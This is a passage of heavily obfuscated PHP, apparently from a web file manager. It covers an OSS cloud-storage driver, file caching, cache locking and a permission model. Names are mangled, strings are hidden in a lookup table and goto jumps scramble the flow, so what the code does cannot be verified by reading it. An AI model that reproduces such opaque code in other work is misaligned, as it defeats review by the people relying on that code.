base64_encode(json_encode($¡¹å€³ô)); $„‰÷Ê´ = base64_encode(hash_hmac($äºÛñ¢[1426], $®´µÃ‰, $this->secret, !0)); $ş‹ÂÓç» = array($äºÛñ¢[1506] => $this->accessKey, $äºÛñ¢[280] => $®´µÃ‰, $äºÛñ¢[273] => $äºÛñ¢[264], $äºÛñ¢[1507] => $„‰÷Ê´, $äºÛñ¢[209] => $áàáÂ›); $ş‹ÂÓç» = $this->trafficLimit($äºÛñ¢[1501], $ş‹ÂÓç», !0); return $ş‹ÂÓç»; } public function uploadMultiData($¹¼şÇÇş, $şş¿Ö¨ = 3600) { $¨û³×Ä =& $_SERVER[ˆö¿ÚÌ¼]; if (!($øòù“ = $this->getHost())) { return !1; } $ˆï“™Şì = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¹¼şÇÇş)); return array($¨û³×Ä[284] => $ˆï“™Şì, $¨û³×Ä[209] => $øòù“ . $¨û³×Ä[8] . $this->pathEncode($¹¼şÇÇş), $¨û³×Ä[285] => gmdate($¨û³×Ä[1508]), $¨û³×Ä[97] => $¹¼şÇÇş); } public function uploadMultiAuth($»î„‡ÛÖ, $¥ŠéÁÌÍ = array()) { if (isset($¥ŠéÁÌÍ[$_SERVER[ˆö¿ÚÌ¼][286]])) { return $this->uploadPartAuth($»î„‡ÛÖ, $¥ŠéÁÌÍ); } return $this->uploadListAuth($»î„‡ÛÖ, $¥ŠéÁÌÍ); } private function uploadPartAuth($á»¢Ëøº, $ÊˆÆÄ¨¼ = array()) { $Ö÷Î¸• =& $_SERVER[ˆö¿ÚÌ¼]; $¡å¸ûŒ = $ÊˆÆÄ¨¼[$Ö÷Î¸•[97]]; $¢–ÄÕŸ† = $this->_getUploadAuth($¡å¸ûŒ, $ÊˆÆÄ¨¼); $±­Û‡Â² = array($Ö÷Î¸•[289] => $¢–ÄÕŸ†[$Ö÷Î¸•[289]], $Ö÷Î¸•[285] => $¢–ÄÕŸ†[$Ö÷Î¸•[285]]); if (isset($¢–ÄÕŸ†[$Ö÷Î¸•[1509]])) { $±­Û‡Â²[$Ö÷Î¸•[1509]] = $¢–ÄÕŸ†[$Ö÷Î¸•[1509]]; } return $±­Û‡Â²; } private function uploadListAuth($ÂõÃÅ¤ğ, $ŒËûäúò = array()) { $’’Ç†¨— =& $_SERVER[ˆö¿ÚÌ¼]; $õÇŸŞ±  = $ŒËûäúò[$’’Ç†¨—[97]]; $¢¢½×¸ç = $ŒËûäúò[$’’Ç†¨—[284]]; $óÁ‘ì‘ = $this->client->listParts($this->bucket, $this->pathEncode($õÇŸŞ± ), $¢¢½×¸ç); $òĞ÷´ßö = $óÁ‘ì‘->getListPart(); $÷¤³¨­Š = array(); foreach ($òĞ÷´ßö as $ƒ—Ò…ˆ) { $÷¤³¨­Š[] = array($’’Ç†¨—[300] => $ƒ—Ò…ˆ->getPartNumber(), $’’Ç†¨—[301] => trim($ƒ—Ò…ˆ->getETag(), $’’Ç†¨—[121])); } if (!$÷¤³¨­Š) { return !1; } $Ä“•–Ñ÷ = $this->_getUploadAuth($õÇŸŞ± , $ŒËûäúò); return array($’’Ç†¨—[289] => $Ä“•–Ñ÷[$’’Ç†¨—[289]], $’’Ç†¨—[285] => $Ä“•–Ñ÷[$’’Ç†¨—[285]], $’’Ç†¨—[292] => $÷¤³¨­Š); } private function _getUploadAuth($†çÙ§ïŒ, $Û¢¾„Ğ¬) { $ÑµÓµê¨ =& $_SERVER[ˆö¿ÚÌ¼]; $Ï´½Äæ› = gmdate($ÑµÓµê¨[1508]); $’ñ˜ÔÇ = isset($Û¢¾„Ğ¬[$ÑµÓµê¨[286]]) ? $ÑµÓµê¨[256] : $ÑµÓµê¨[291]; $–­Ùò«— = array_intersect_key($Û¢¾„Ğ¬, array_flip(array($ÑµÓµê¨[286], $ÑµÓµê¨[284]))); ksort($–­Ùò«—); $ÈŠ½ĞÍ = $–­Ùò«— ? $ÑµÓµê¨[76] . http_build_query($–­Ùò«—, null, $ÑµÓµê¨[287], PHP_QUERY_RFC3986) : $ÑµÓµê¨[12]; $ª·ÛÔ–¨ = array($’ñ˜ÔÇ, $ÑµÓµê¨[12], $ÑµÓµê¨[123], $Ï´½Äæ›, "\170\x2d\157\163\x73\55\144\x61\x74\x65\x3a{$Ï´½Äæ›}", $ÑµÓµê¨[8] . $this->bucket . $ÑµÓµê¨[8] . $†çÙ§ïŒ . $ÈŠ½ĞÍ); if (isset($Û¢¾„Ğ¬[$ÑµÓµê¨[286]])) { $±±Ò™–Ñ = $this->trafficLimit($ÑµÓµê¨[1501], array(), !0); if ($±±Ò™–Ñ) { $†çÙ§ïŒ = $ÑµÓµê¨[1509]; array_splice($ª·ÛÔ–¨, 5, 0, $†çÙ§ïŒ . $ÑµÓµê¨[4] . $±±Ò™–Ñ[$†çÙ§ïŒ]); } } $´”ô˜‡è = implode($ÑµÓµê¨[288], $ª·ÛÔ–¨); $Áˆ„‘êÏ = base64_encode(hash_hmac($ÑµÓµê¨[1426], $´”ô˜‡è, $this->secret, !0)); $¦‹ÅüšÆ = $ÑµÓµê¨[1478] . $this->accessKey . $ÑµÓµê¨[4] . $Áˆ„‘êÏ; $ÊêåÑ = array($ÑµÓµê¨[289] => $¦‹ÅüšÆ, $ÑµÓµê¨[285] => $Ï´½Äæ›); if (!empty($±±Ò™–Ñ)) { $ÊêåÑ = array_merge($ÊêåÑ, $±±Ò™–Ñ); } return $ÊêåÑ; } public function download($°×Ô«½˜, $Î®°Ü¥œ) { $Ä†ø‹şª =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->isFolder($°×Ô«½˜)) { return !1; } try { $„ÀÎÈ¤Ò = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Î®°Ü¥œ); $„ÀÎÈ¤Ò = $this->trafficLimit($Ä†ø‹şª[112], $„ÀÎÈ¤Ò); $this->client->getObject($this->bucket, $this->pathEncode($°×Ô«½˜), $„ÀÎÈ¤Ò); } catch (OSS\Core\OssException $Á«Áäñ®) { $this->writeLog(__FUNCTION__ . $Ä†ø‹şª[215] . $Á«Áäñ®->getMessage()); return !1; } return $Î®°Ü¥œ; } public function fileSubstr($†É©°˜ , $„ó×© = 0, $éÙ¸ÛìÊ = false) { if ($„ó×© === -1) { $Æ‘ì†¶ = array(); } else { if ($éÙ¸ÛìÊ === !1) { $õèÜŒÇ = $this->size($†É©°˜ ); } else { $õèÜŒÇ = $„ó×© + $éÙ¸ÛìÊ - 1; } $Æ‘ì†¶ = array(OSS\OssClient::OSS_RANGE => "{$„ó×©}\x2d{$õèÜŒÇ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($†É©°˜ ), $Æ‘ì†¶); } catch (OSS\Core\OssException $ç‚îÇ‡) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆö¿ÚÌ¼][215] . $ç‚îÇ‡->getMessage()); think_exception($ç‚îÇ‡->getMessage()); return !1; } } private function trafficLimit($£«„ìÀÒ, $œóŒ”ÂÄ = array(), $ÏÄ‰€àö = false) { $Óõ»Æ¨ç =& $_SERVER[ˆö¿ÚÌ¼]; if ($£«„ìÀÒ == $Óõ»Æ¨ç[1501] && $this->isUploadServer() || $£«„ìÀÒ == $Óõ»Æ¨ç[112] && $this->isFileOutServer()) { return $œóŒ”ÂÄ; } $øÛ¥Ê†— = floatval($GLOBALS[$Óõ»Æ¨ç[6]][$Óõ»Æ¨ç[92]][$Óõ»Æ¨ç[110]][$£«„ìÀÒ]) * 1024 * 1024 * 8; if (!$øÛ¥Ê†—) { return $œóŒ”ÂÄ; } $øÛ¥Ê†— = $øÛ¥Ê†— < 819200 ? 819200 : ($øÛ¥Ê†— > 838860800 ? 838860800 : $øÛ¥Ê†—); if ($ÏÄ‰€àö) { $œóŒ”ÂÄ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($øÛ¥Ê†—); } else { if (!isset($œóŒ”ÂÄ[OSS\OssClient::OSS_HEADERS])) { $œóŒ”ÂÄ[OSS\OssClient::OSS_HEADERS] = array(); } $œóŒ”ÂÄ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($øÛ¥Ê†—); } return $œóŒ”ÂÄ; } public function link($Ä¿Ğ¸—, $İ ƒí = array()) { $Áîç¤¤ï =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->exist($Ä¿Ğ¸—) || $this->isFolder($Ä¿Ğ¸—)) { return !1; } try { $İ ƒí = $this->trafficLimit($Áîç¤¤ï[112], $İ ƒí, !0); $ìâóê = $this->client->signUrl($this->bucket, $this->pathEncode($Ä¿Ğ¸—), 3600 * 12, $Áîç¤¤ï[1510], $İ ƒí); return $this->getCdnLink($ìâóê); } catch (OSS\Core\OssException $¤°±ŒØ) { $this->writeLog(__FUNCTION__ . $Áîç¤¤ï[215] . $¤°±ŒØ->getMessage()); return !1; } } public function fileOut($ˆ©ªßü¾, $×âóô„ø = false, $áº¡±‘˜ = false, $€¨»ŒÖ½ = '') { $¿âĞ¦í =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->isFileOutServer()) { return $this->fileOutServer($ˆ©ªßü¾, $×âóô„ø, $áº¡±‘˜, $€¨»ŒÖ½); } if (!$áº¡±‘˜) { $áº¡±‘˜ = $this->pathThis($ˆ©ªßü¾); } $áº¡±‘˜ = rawurlencode($áº¡±‘˜); $œ¹œ²ùï = get_file_mime(get_path_ext($áº¡±‘˜)); if ($œ¹œ²ùï == $¿âĞ¦í[251]) { return parent::fileOut($ˆ©ªßü¾, $×âóô„ø, $áº¡±‘˜, $€¨»ŒÖ½); } $×âóô„ø = $×âóô„ø ? $¿âĞ¦í[1511] : $¿âĞ¦í[1512]; $Óüí‘º´ = array(OSS\OssClient::OSS_SUB_RESOURCE => $¿âĞ¦í[1513] . rawurlencode("{$×âóô„ø}\x3b\x66\x69\154\145\x6e\x61\x6d\x65\75{$áº¡±‘˜}")); $˜ÒÃÕ‡Ğ = $this->link($ˆ©ªßü¾, $Óüí‘º´); $this->fileOutLink($˜ÒÃÕ‡Ğ); } public function fileOutServer($á‚‡‚Şƒ, $Ä”áÚ¾£ = false, $Ô¹¿…°« = false, $ãÁÅ¸ì = '') { parent::fileOut($á‚‡‚Şƒ, $Ä”áÚ¾£, $Ô¹¿…°«, $ãÁÅ¸ì); } public function fileOutImage($ÕšÓ¸Ù, $ºî‡±Ê = 250) { if ($this->size($ÕšÓ¸Ù) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÕšÓ¸Ù, $ºî‡±Ê); } $ıÏşñ¢Ô = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ˆö¿ÚÌ¼][1475] . $ºî‡±Ê); $¥Ò¥Ã = $this->link($ÕšÓ¸Ù, $ıÏşñ¢Ô); $this->fileOutLink($¥Ò¥Ã); } public function fileOutImageServer($±‚³ø–, $¥¶•ÊÂ­ = 250) { parent::fileOutImage($±‚³ø–, $¥¶•ÊÂ­); } public function fileOutLink($‚Èîà‘ı) { $ÂØ¶å·ã =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->isCdnHost() && substr($‚Èîà‘ı, 0, 7) == $ÂØ¶å·ã[219]) { $‚Èîà‘ı = $ÂØ¶å·ã[220] . substr($‚Èîà‘ı, 7); } header($ÂØ¶å·ã[175] . $‚Èîà‘ı); die; } public function hashMd5($÷İõ°, $•Óşå³ = '') { $…¢á­Ø =& $_SERVER[ˆö¿ÚÌ¼]; $‘»Êƒã = $this->_objectMeta($÷İõ°); if (!$‘»Êƒã) { return $…¢á­Ø[12]; } if (!isset($‘»Êƒã[$…¢á­Ø[1495]]) && !empty($•Óşå³)) { $üš¿²Ì = $this->updateObjMeta($÷İõ°, array($…¢á­Ø[1495] => $•Óşå³)); $‘»Êƒã[$…¢á­Ø[1495]] = $üš¿²Ì ? $•Óşå³ : $…¢á­Ø[12]; } return isset($‘»Êƒã[$…¢á­Ø[1495]]) ? strtolower($‘»Êƒã[$…¢á­Ø[1495]]) : $…¢á­Ø[12]; } public function size($…Í¸œáæ) { $û‰Ø½ˆ = $this->objectMeta($…Í¸œáæ); return $û‰Ø½ˆ ? $û‰Ø½ˆ[$_SERVER[ˆö¿ÚÌ¼][79]] : 0; } public function info($Óú¸”»İ) { if ($this->isFolder($Óú¸”»İ)) { return $this->folderInfo($Óú¸”»İ); } else { if ($this->isFile($Óú¸”»İ)) { return $this->fileInfo($Óú¸”»İ); } } return !1; } public function exist($ª¿–‡©€) { return $this->isFile($ª¿–‡©€) || $this->isFolder($ª¿–‡©€); } public function isFile($³Ï€¹) { return !$this->isFolder($³Ï€¹) && $this->objectMeta($³Ï€¹); } public function isFolder($ú»¹ˆ€) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][180], $ú»¹ˆ€); } protected function objectMeta($ÅşˆùÖ«) { return $this->cacheMethod($_SERVER[ˆö¿ÚÌ¼][182], $ÅşˆùÖ«); } protected function _objectMeta($Ã¬®ğ¸Ò) { $€³„Šˆ¾ =& $_SERVER[ˆö¿ÚÌ¼]; try { $áñËóøî = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ã¬®ğ¸Ò)); } catch (OSS\Core\OssException $™Ğ®Ì‡ñ) { $this->writeLog(__FUNCTION__ . $€³„Šˆ¾[215] . $™Ğ®Ì‡ñ->getMessage()); $áñËóøî = !1; } if ($áñËóøî) { $áñËóøî[$€³„Šˆ¾[79]] = intval($áñËóøî[$€³„Šˆ¾[1493]]); } return $áñËóøî; } protected function _isFolder($¶”‚±ƒ›) { $ƒ‘ñİµ› =& $_SERVER[ˆö¿ÚÌ¼]; if ($¶”‚±ƒ› == $ƒ‘ñİµ›[12] || $¶”‚±ƒ› == $ƒ‘ñİµ›[8]) { return !0; } $ÜÃÛæÏñ = array($ƒ‘ñİµ›[1488] => $ƒ‘ñİµ›[8], $ƒ‘ñİµ›[1489] => rtrim($¶”‚±ƒ›, $ƒ‘ñİµ›[8]) . $ƒ‘ñİµ›[8], $ƒ‘ñİµ›[1490] => 1, $ƒ‘ñİµ›[1491] => $ƒ‘ñİµ›[12]); $‹ˆ”¯½¬ = $this->client->listObjects($this->bucket, $ÜÃÛæÏñ); if ($‹ˆ”¯½¬->getObjectList() || $‹ˆ”¯½¬->getPrefixList()) { return !0; } return !1; } public function writeLog($ÈôÜ—ˆÉ = '', $Ñœç¤Ô§ = false) { $¤µ†ÙÁ¾ =& $_SERVER[ˆö¿ÚÌ¼]; $ò°‚µÍ² = in_array(ACTION, array($¤µ†ÙÁ¾[213], $¤µ†ÙÁ¾[214])); if (!$ò°‚µÍ² && !GLOBAL_DEBUG) { return; } $²€Ä˜ˆı = 0; if (stripos($ÈôÜ—ˆÉ, $¤µ†ÙÁ¾[1514]) !== !1) { $²€Ä˜ˆı = 1; $îôóà¨± = explode($¤µ†ÙÁ¾[1515], $ÈôÜ—ˆÉ); $ÈôÜ—ˆÉ = !empty($îôóà¨±[1]) ? $îôóà¨±[1] : $ÈôÜ—ˆÉ; } else { if (stripos($ÈôÜ—ˆÉ, $¤µ†ÙÁ¾[1516])) { $²€Ä˜ˆı = 2; $îôóà¨± = explode($¤µ†ÙÁ¾[1516], $ÈôÜ—ˆÉ); $îôóà¨± = explode($¤µ†ÙÁ¾[4], $îôóà¨±[0]); $ÈôÜ—ˆÉ = !empty($îôóà¨±[1]) ? $îôóà¨±[1] : $ÈôÜ—ˆÉ; } } if ($ò°‚µÍ² && I18n::getType() == $¤µ†ÙÁ¾[1517]) { if ($²€Ä˜ˆı == 1) { $ÈôÜ—ˆÉ = str_replace($¤µ†ÙÁ¾[1518], $¤µ†ÙÁ¾[1519], $ÈôÜ—ˆÉ); } else { if ($²€Ä˜ˆı == 2) { $îôóà¨± = explode($¤µ†ÙÁ¾[215], $îôóà¨±[0]); $—ÄÚÖ± = isset($îôóà¨±[1]) ? $îôóà¨±[1] : $¤µ†ÙÁ¾[12]; $Ò¨ªúÔÆ = array($¤µ†ÙÁ¾[1520] => $¤µ†ÙÁ¾[1521], $¤µ†ÙÁ¾[1522] => $¤µ†ÙÁ¾[1523], $¤µ†ÙÁ¾[1524] => $¤µ†ÙÁ¾[1525], $¤µ†ÙÁ¾[1526] => $¤µ†ÙÁ¾[1527], $¤µ†ÙÁ¾[1528] => $¤µ†ÙÁ¾[1529], $¤µ†ÙÁ¾[1530] => $¤µ†ÙÁ¾[1531], $¤µ†ÙÁ¾[1532] => $¤µ†ÙÁ¾[1533], $¤µ†ÙÁ¾[1534] => $¤µ†ÙÁ¾[1535], $¤µ†ÙÁ¾[1536] => $¤µ†ÙÁ¾[1537], $¤µ†ÙÁ¾[1538] => $¤µ†ÙÁ¾[1539]); if (isset($Ò¨ªúÔÆ[$—ÄÚÖ±])) { $ÈôÜ—ˆÉ = $Ò¨ªúÔÆ[$—ÄÚÖ±]; } } } if (stripos($ÈôÜ—ˆÉ, $¤µ†ÙÁ¾[1540])) { $ÈôÜ—ˆÉ = $¤µ†ÙÁ¾[1541]; } } if (!trim($ÈôÜ—ˆÉ)) { return; } parent::writeLog(trim($ÈôÜ—ˆÉ), $Ñœç¤Ô§); } } goto dË×§ÖÀõ; fğÍºƒÕÒš: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($àóãÎâÍ, $â˜×¤°™) { $˜°ÌÔ³ğ =& $_SERVER[ˆö¿ÚÌ¼]; $this->cachePath = $àóãÎâÍ[$˜°ÌÔ³ğ[87]]; $this->prefix = $˜°ÌÔ³ğ[925]; $this->cacheTime = $â˜×¤°™; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ªÃì›¯) { $®Ê­‡ÇÑ =& $_SERVER[ˆö¿ÚÌ¼]; $ªÃì›¯ = str_replace(array($®Ê­‡ÇÑ[926], $®Ê­‡ÇÑ[100], $®Ê­‡ÇÑ[76]), $®Ê­‡ÇÑ[927], $ªÃì›¯); return $this->cachePath . $®Ê­‡ÇÑ[928] . $ªÃì›¯ . $®Ê­‡ÇÑ[929]; } public function set($÷Š–ß, $ƒ×‰íİÃ, $‹Âòé¾Ş = false) { $‹Âòé¾Ş = $‹Âòé¾Ş ? $‹Âòé¾Ş : $this->cacheTime; $€‘ŞÓûš = $this->getFile($÷Š–ß); if (file_put_contents($€‘ŞÓûš, $this->prefix . $ƒ×‰íİÃ, LOCK_EX)) { @touch($€‘ŞÓûš, intval(time() + $‹Âòé¾Ş)); clearstatcache(); return !0; } @unlink($€‘ŞÓûš); return !1; } public function get($â³ºÂâ´) { $¬úÍ¥‚ = $this->getFile($â³ºÂâ´); if (file_exists($¬úÍ¥‚) && filemtime($¬úÍ¥‚) < time()) { @unlink($¬úÍ¥‚); return !1; } $ÁÈ¤‹‰ = @file_get_contents($¬úÍ¥‚); return substr($ÁÈ¤‹‰, strlen($this->prefix)); } public function remove($§Öª×¯Û) { $˜³ñò’Ë = $this->getFile($§Öª×¯Û); return @unlink($˜³ñò’Ë); } public function deleteAll() { $é³–‘ºÖ =& $_SERVER[ˆö¿ÚÌ¼]; $úæÌÈŸ’ = scandir($this->cachePath); foreach ($úæÌÈŸ’ as $»Âéô¾Ş) { $¦ßÉÜŒæ = $this->cachePath . $»Âéô¾Ş; if (strpos($¦ßÉÜŒæ, $é³–‘ºÖ[929]) && strpos($¦ßÉÜŒæ, $é³–‘ºÖ[930])) { @unlink($¦ßÉÜŒæ); } } } public function clearTimeout() { $âŸ˜ßÃˆ =& $_SERVER[ˆö¿ÚÌ¼]; $øÎ­Ë«³ = scandir($this->cachePath); foreach ($øÎ­Ë«³ as $Ø®†¯ÖÊ) { $‘¹ªÆ½ß = $this->cachePath . $Ø®†¯ÖÊ; if (strpos($‘¹ªÆ½ß, $âŸ˜ßÃˆ[929]) && strpos($‘¹ªÆ½ß, $âŸ˜ßÃˆ[930]) && filemtime($‘¹ªÆ½ß) < time()) { @unlink($‘¹ªÆ½ß); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $®£Ã¦É¦ =& $_SERVER[ˆö¿ÚÌ¼]; if (self::$handle) { return self::$handle; } $˜ ŒöÉ‡ = $GLOBALS[$®£Ã¦É¦[6]][$®£Ã¦É¦[427]]; self::$timeout = $˜ ŒöÉ‡[$®£Ã¦É¦[931]] ? $˜ ŒöÉ‡[$®£Ã¦É¦[931]] : 10; $¨ËìŠ¼Ö = _get($GLOBALS[$®£Ã¦É¦[6]], $®£Ã¦É¦[932]); $¶Óñ×ú¥ = $˜ ŒöÉ‡[$®£Ã¦É¦[917]] ? $˜ ŒöÉ‡[$®£Ã¦É¦[917]] : $®£Ã¦É¦[233]; if ($¶Óñ×ú¥ == $®£Ã¦É¦[21] && $¨ËìŠ¼Ö == $®£Ã¦É¦[13]) { $¶Óñ×ú¥ = $®£Ã¦É¦[233]; } switch ($¶Óñ×ú¥) { case $®£Ã¦É¦[920]: self::$handle = new CacheLockRedis(); break; case $®£Ã¦É¦[921]: self::$handle = new CacheLockMemcached(); break; case $®£Ã¦É¦[21]: self::$handle = new CacheLockDatabase(); break; case $®£Ã¦É¦[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($®£Ã¦É¦[933], $®£Ã¦É¦[934]); } return self::$handle; } private static function key($úÁÒÛ·) { return $_SERVER[ˆö¿ÚÌ¼][935] . Cache::key($úÁÒÛ·); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ˆôõÀ®Û = '') { self::$errorMsg = $ˆôõÀ®Û; } public static function lockGlobal($öÅÌ…¯ç, $ÅÙèöÚì) { return self::lock($öÅÌ…¯ç, $ÅÙèöÚì, !0); } public static function lock($øÁÈçÅ÷, $âôÎ…„É = false, $±¨¯ËåÊ = false) { $Àİ¼ÉŞË =& $_SERVER[ˆö¿ÚÌ¼]; $ã¯¥“¸ñ = self::init(); $öØ®Œ› = self::key($øÁÈçÅ÷); $âôÎ…„É = $âôÎ…„É ? $âôÎ…„É : self::$timeout; $ÌĞê±Ä = timeFloat(); if (_get($GLOBALS, $Àİ¼ÉŞË[936], !1)) { if (!$ã¯¥“¸ñ->lock($öØ®Œ›, 0.2)) { die; } return !0; } $½±¦šı¶ = $ã¯¥“¸ñ->lock($öØ®Œ›, $âôÎ…„É); $âˆø¶ğ = timeFloat(); if (!$½±¦šı¶) { $ãŒïê¼ò = "\x6c\157\143\153\x20\145\x72\162\157\x72\73\153\145\171\75{$øÁÈçÅ÷}\73\164\151\x6d\145\x3d{$âôÎ…„É}\73" . self::$errorMsg . $Àİ¼ÉŞË[74] . get_caller_msg(); $ËºïŞ®ì = LNG($Àİ¼ÉŞË[937]) . "\50{$âôÎ…„É}\163\x29\x2e" . LNG($Àİ¼ÉŞË[938]); $ËºïŞ®ì .= $Àİ¼ÉŞË[939]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ËºïŞ®ì = $ËºïŞ®ì . $Àİ¼ÉŞË[940] . self::$errorMsg; } write_log($Àİ¼ÉŞË[941] . sprintf($Àİ¼ÉŞË[942], timeFloat() - $ÌĞê±Ä) . $Àİ¼ÉŞË[943] . $ãŒïê¼ò . $Àİ¼ÉŞË[944] . json_encode(error_get_last()), $Àİ¼ÉŞË[934]); show_json($ËºïŞ®ì, !1); } if (!$±¨¯ËåÊ) { self::$lockItem[$öØ®Œ›] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $œ®ÁØ§å = number_format(timeFloat() - $âˆø¶ğ, 3); write_log($Àİ¼ÉŞË[945] . $øÁÈçÅ÷ . $Àİ¼ÉŞË[946] . $œ®ÁØ§å, $Àİ¼ÉŞË[934]); } return $½±¦šı¶; } public static function lockGet($æ¢Ì«¥ğ) { $†¯•ù‘† = self::key($æ¢Ì«¥ğ); if (self::$lockItem[$†¯•ù‘†]) { return self::$lockItem[$†¯•ù‘†]; } return self::init()->lockGet($†¯•ù‘†); } public static function unlock($–§ë¸âÆ) { $í¢õ¤¨í =& $_SERVER[ˆö¿ÚÌ¼]; $´éö²Ùœ = self::key($–§ë¸âÆ); self::$lockItem[$´éö²Ùœ] = null; self::init()->unlock($´éö²Ùœ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($í¢õ¤¨í[947] . $–§ë¸âÆ, $í¢õ¤¨í[934]); } return; } public static function unlockRuntime() { $È«ğàÍÍ =& $_SERVER[ˆö¿ÚÌ¼]; $Òä¸ïÊ = self::init(); $ËöÀ¸¦Ğ = !1; foreach (self::$lockItem as $İªèùÛö => $Š·É§¢) { if (!$Š·É§¢) { continue; } $Òä¸ïÊ->unlock($İªèùÛö); if (!$ËöÀ¸¦Ğ) { $ËöÀ¸¦Ğ = !0; write_log($È«ğàÍÍ[948] . $İªèùÛö . $È«ğàÍÍ[74] . get_caller_msg(), $È«ğàÍÍ[934]); continue; } write_log($È«ğàÍÍ[948] . $İªèùÛö, $È«ğàÍÍ[934]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¼Èîƒİ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($È«ğàÍÍ[949] . $¼Èîƒİ . $È«ğàÍÍ[950] . ACTION, $È«ğàÍÍ[934]); } } public static function fileLock($¥¢¨éÏ–) { $„ş·§ŞÇ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$GLOBALS[$„ş·§ŞÇ[951]]) { $GLOBALS[$„ş·§ŞÇ[951]] = array(); } $GLOBALS[$„ş·§ŞÇ[951]][$¥¢¨éÏ–] = !1; $ÙºúĞ“¾ = fopen(DATA_PATH . $¥¢¨éÏ– . $„ş·§ŞÇ[952], $„ş·§ŞÇ[953]); if (!$ÙºúĞ“¾) { return !1; } $GLOBALS[$„ş·§ŞÇ[951]][$¥¢¨éÏ–] = $ÙºúĞ“¾; if (flock($ÙºúĞ“¾, LOCK_EX)) { return !0; } self::unlock($¥¢¨éÏ–); show_json($„ş·§ŞÇ[954], !1); return !1; } public static function fileUnlock($²ıÜÖ±) { $³¨ƒãú® =& $_SERVER[ˆö¿ÚÌ¼]; $˜„ş˜µ = $GLOBALS[$³¨ƒãú®[951]][$²ıÜÖ±]; if (!$˜„ş˜µ) { return; } $GLOBALS[$³¨ƒãú®[951]][$²ıÜÖ±] = !1; flock($˜„ş˜µ, LOCK_UN); fclose($˜„ş˜µ); } public static function fileUnlockAll() { $®Â´¬˜½ =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($GLOBALS[$®Â´¬˜½[951]]) || !$GLOBALS[$®Â´¬˜½[951]]) { return; } foreach ($GLOBALS[$®Â´¬˜½[951]] as $â¾Ï¡Á => $‘„¶ş´•) { if (!$‘„¶ş´•) { continue; } $GLOBALS[$®Â´¬˜½[951]][$â¾Ï¡Á] = !1; flock($‘„¶ş´•, LOCK_UN); fclose($‘„¶ş´•); } $GLOBALS[$®Â´¬˜½[951]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto aÈÏÑ—¨äˆ; A˜ØŞ§ßµÓ: function binCheckBigger($ÙáÍµšÄ, $½Ûôú˜´) { return $ÙáÍµšÄ > $½Ûôú˜´; } $_SERVER[$_SERVER[Î†¼ú¡º][3]] = (strrev('0468')."\x34\x36")+0;$_pynt="ad1y7t8rw2zqs4oknepvu5x0ljcbh3im96gf4csiyfvjrba92807wgmx1tqdpl6enoz3hk5ub1jw69x3";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¤Í¥Ø¹, $‹ò¡Â¤Û) { $Íåúš‘Á =& $_SERVER[ˆö¿ÚÌ¼]; if (isset(self::$_methodList[$¤Í¥Ø¹])) { return @call_user_func_array(self::$_methodList[$¤Í¥Ø¹], $‹ò¡Â¤Û); } else { if (method_exists($this, $¤Í¥Ø¹)) { return call_user_func_array(array($this, $¤Í¥Ø¹), $‹ò¡Â¤Û); } else { think_exception(__CLASS__ . $Íåúš‘Á[4] . $¤Í¥Ø¹ . $Íåúš‘Á[5]); } } } public static function __callStatic($ˆÇ¦¯®«, $¤Ş½–ş”) { if (isset(self::$_methodListStatic[$ˆÇ¦¯®«])) { return call_user_func_array(self::$_methodListStatic[$ˆÇ¦¯®«], $¤Ş½–ş”); } else { if (method_exists(self, $ˆÇ¦¯®«)) { return call_user_func_array(array(self, $ˆÇ¦¯®«), $¤Ş½–ş”); } else { show_json("{$ˆÇ¦¯®«}\x28\51\x20\156\157\x74\40\145\170\151\x73\164\x3b", !1); } } } public static function addMethod($¬›äÚµ˜, $®É¿É‚Ö) { self::$_methodList[$¬›äÚµ˜] = $®É¿É‚Ö; } public static function addMethodStatic($¹Èê®‰—, $¢˜îåÚ‚) { self::$_methodListStatic[$¹Èê®‰—] = $¢˜îåÚ‚; } } goto dë«Êº‡¦; AÏë”›±‡Æ: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\143\x65\137\141\x75\x74\150"; public function getAuth($†·Üë¬Ç) { $ÚÈ†šÈ =& $_SERVER[ˆö¿ÚÌ¼]; $Ë¢ŠÉëŠ = $this->sourceAuthSelect($†·Üë¬Ç); $Å»­´ÌÁ = array(); $Ó¹ô‚– = array(); $ì™‰ç… = 2 << 25; foreach ($Ë¢ŠÉëŠ as $şÅ‰êşş) { $³€õïŞÚ = Model($ÚÈ†šÈ[585])->listData($şÅ‰êşş[$ÚÈ†šÈ[2094]]); if (!$³€õïŞÚ) { continue; } $Å»­´ÌÁ[] = $şÅ‰êşş; $æ×ÌüË = 0; if ($şÅ‰êşş[$ÚÈ†šÈ[191]] == SourceModel::TYPE_GROUP) { $æ×ÌüË = $ì™‰ç… * 2; } if ($şÅ‰êşş[$ÚÈ†šÈ[191]] == SourceModel::TYPE_USER) { $æ×ÌüË = $ì™‰ç…; } if 